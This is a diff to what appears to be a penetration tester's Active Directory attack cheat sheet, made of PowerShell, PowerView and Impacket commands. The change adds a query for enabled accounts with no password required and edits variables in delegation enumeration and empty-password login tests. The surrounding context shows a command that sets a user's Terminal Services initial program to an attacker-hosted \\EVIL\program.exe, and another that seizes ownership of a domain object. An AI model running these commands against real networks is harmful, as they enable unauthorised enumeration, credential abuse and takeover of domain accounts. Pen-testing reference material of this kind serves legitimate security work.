@@ -25,6 +25,7 @@ permalink: /pen/ad/discov/win
 * [shoot](#shoot)
 	* [shoot-forest](#shoot-forest)
 	* [shoot-dom](#shoot-dom)
+		* [shoot-pwd-notreqd](#shoot-pwd-notreqd)
 		* [shoot-pwd-policy](#shoot-pwd-policy)
 		* [shoot-delegations](#shoot-delegations)
 		* [shoot-priv-users](#shoot-priv-users)
@@ -206,7 +207,11 @@ get-domainobjectacl $zdom_dn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 $search_base = "CN=AdminSDHolder,CN=System," + $zdom_dn
 Get-DomainObjectAcl -SearchBase $search_base -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 ```
-
+#### <a name='shoot-pwd-notreqd'></a>shoot-pwd-notreqd
+```powershell
+# ActiveDirectory module 
+Get-ADUser -Filter {PasswordNotRequired -eq $true -and Enabled -eq $true} | Select SamAccountName 
+```
 #### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
 ```powershell
 net accounts
@@ -229,10 +234,10 @@ Easy enumeration with **Impacket\FindDelegation.py**:
 
 ```powershell
 # with password in the CLI
-$zz = $zdom_fqdn + '/' + $zlat_user + ':"PASSWORD"'
+$zz = $zdom_fqdn + '/' + $ztarg_user_name + ':' + $ztarg_user_pass
 .\findDelegation.py  $zz
 # with kerberos auth / password not in the CLI
-$zz = $zdom_fqdn + '/' + $zlat_user
+$zz = $zdom_fqdn + '/' + $ztarg_user_user
 .\findDelegation.py  $zz -k -no-pass
 ```
 
@@ -275,7 +280,7 @@ Get-DomainGroup -AdminCount -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn |
 ```
 
 #### <a name='shoot-gpo'></a>shoot-gpo
-```
+```sh
 # list sysvol
 ls \\$zdom_fqdn\SYSVOL\$zdom_fqdn\Policies\
 
@@ -387,7 +392,7 @@ wmic useraccount where name='melanie' get sid
 ### <a name='iter-memberof'></a>iter-memberof
 ```powershell
 # identify if the new account is 'memberof' new groups 
-get-netgroup -MemberIdentity $zlat_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn | ft -autosize >> .\grp_xxx.txt
+get-netgroup -MemberIdentity $ztarg_user_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn | ft -autosize >> .\grp_xxx.txt
 
 # identify if the new account is 'memberof' new groups 
 get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn, whenCreated, accountExpires, pwdLastSet, lastLogon, logonCount, badPasswordTime, badPwdCount | ft -autosize | Sort-Object -Descending -Property whenCreated >> .\auth_xxx.txt
@@ -463,7 +468,7 @@ Get-LastLoggedon -ComputerName $ztarg_computer -Credential $zlat_creds
 
 # testing account "john_doe" with empty passwords 
 $zlat_creds = New-Object System.Management.Automation.PSCredential($ztarg_user, (new-object System.Security.SecureString))
-Invoke-Command -Credential $zlat_credz -ComputerName $ztarg_computer -ScriptBlock {whoami; hostname}
+Invoke-Command -Credential $zlat_creds -ComputerName $ztarg_computer -ScriptBlock {whoami; hostname}
 ```
 
 ### <a name='last-logons-ou'></a>last-logons-ou
@@ -557,5 +562,5 @@ Get-DomainGroup -GroupScope NotGlobal -Properties name -Domain $zdom_fqdn -Domai
 Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # set the owner of $ztarg_obj in the current domain to $zlat_user
-Set-DomainObjectOwner -Identity $ztarg_obj -OwnerIdentity $zlat_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Set-DomainObjectOwner -Identity $ztarg_obj -OwnerIdentity $ztarg_user_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 ```
